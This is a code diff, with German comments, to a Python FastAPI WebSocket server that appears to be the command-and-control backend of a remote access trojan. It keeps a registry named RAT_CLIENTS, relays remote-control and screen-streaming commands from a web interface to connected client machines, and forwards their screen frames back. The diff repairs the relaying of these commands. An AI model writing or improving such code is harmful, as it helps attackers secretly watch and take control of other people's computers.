@@ -60,23 +60,17 @@ async def websocket_endpoint(websocket: WebSocket):
     WEB_UI_SOCKET = websocket
     print("Web-UI verbunden.")
 
-    # Sende vollständige Client-Liste mit Hostnamen
     await send_client_list()
     try:
         while True:
             data = await websocket.receive_json()
-        # Forward control events to client
-        if data.get('action') == 'control':
-            target = data.get('client_id')
-            if target in RAT_CLIENTS:
-                await RAT_CLIENTS[target].send_json(data)
-            continue
-
-            # Handle screen frame
-            if data.get('action') == 'screen_frame':
-                await send_to_web_ui({'action':'screen_frame','client_id': client_id,'data': data.get('data')})
+            # --- Screenstream/Control Weiterleitung ---
+            if data.get('action') in ('screenstream_start', 'screenstream_stop', 'control'):
+                target = data.get('client_id')
+                if target in RAT_CLIENTS:
+                    await RAT_CLIENTS[target].send_json(data)
                 continue
-
+            # --- Standard-Kommandos ---
             action = data.get("action")
             target_id = data.get("target_id")
             if not target_id or target_id not in RAT_CLIENTS:
@@ -180,18 +174,11 @@ async def rat_client_endpoint(websocket: WebSocket):
     try:
         while True:
             data = await websocket.receive_json()
-        # Forward control events to client
-        if data.get('action') == 'control':
-            target = data.get('client_id')
-            if target in RAT_CLIENTS:
-                await RAT_CLIENTS[target].send_json(data)
-            continue
-
-            # Handle screen frame
+            # --- Screen-Frame Weiterleitung ---
             if data.get('action') == 'screen_frame':
                 await send_to_web_ui({'action':'screen_frame','client_id': client_id,'data': data.get('data')})
                 continue
-
+            # --- Standard-Kommandos ---
             data["client_id"] = client_id
             await send_to_web_ui(data)
     except WebSocketDisconnect:
